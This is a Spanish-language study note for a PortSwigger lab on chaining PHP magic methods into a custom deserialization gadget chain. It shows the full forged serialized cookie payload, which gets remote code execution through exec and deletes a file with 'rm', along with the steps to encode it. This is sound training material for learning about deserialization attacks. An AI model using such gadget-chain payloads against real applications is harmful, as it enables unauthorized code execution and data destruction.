---
aliases:
  - Deser 009 - custom PHP gadget chain
  - CustomTemplate __wakeup DefaultMap __get
tags:
  - vuln/insecure-deserialization
  - example
  - portswigger
---

# 009 — Gadget chain PHP propio (encadenar magic methods)

> Lab: [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization) · **Expert** · técnica → [[vulnerabilities/013-insecure_deserialization/insecure-deserialization|entry point]]

## Ficha
- **Objeto:** PHP — cadena de **2 clases** (`CustomTemplate` + `DefaultMap`).
- **Codificación:** `base64` → `url` → cookie.
- **Herramienta:** ninguna, **a mano** (construís el serializado leyendo la fuente).
- **Efecto:** **RCE** → `exec("rm /home/carlos/morale.txt")`.

## Paso 1 — leer el código fuente
Igual que 004, con `~`:
> `GET /cgi-bin/libs/CustomTemplate.php`==`~`==

## La cadena (el "chain")
Encadenás métodos mágicos que se llaman entre sí:

1. `CustomTemplate::__wakeup()` (al deserializar) instancia un `Product`.
2. `Product` accede a `default_desc_type` sobre un `DefaultMap` → como no existe, dispara `DefaultMap::__get()`.
3. `__get()` hace `call_user_func($callback, $atributo)` → con `callback="exec"` y el atributo = tu comando.

## El objeto que forjás
> `O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"`==`rm /home/carlos/morale.txt`==`";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"`==`exec`==`";}}`

## El pipeline de codificación
> `serializado a mano` **⟶** ==`base64`== **⟶** ==`url`== **⟶** cookie

## Por qué funciona
- Ninguna clase por sí sola da RCE; el poder está en **encadenarlas**: `__wakeup` → `__get` → `call_user_func`.
- Es la versión avanzada de [[vulnerabilities/013-insecure_deserialization/examples/004-object-injection-php|004]]: allá una clase con `__destruct`; acá **construís vos la cadena** leyendo el código.

## Detalles que se pasan por alto
- **Mapear la fuente primero:** qué magic method llama a qué, hasta encontrar un sink (`call_user_func`, `eval`, `include`).
- Contá **todas** las longitudes (`s:N:`) — un objeto anidado mal contado no deserializa.

→ Siguiente: [[vulnerabilities/013-insecure_deserialization/examples/010-phar-deserialization|010 · PHAR]]
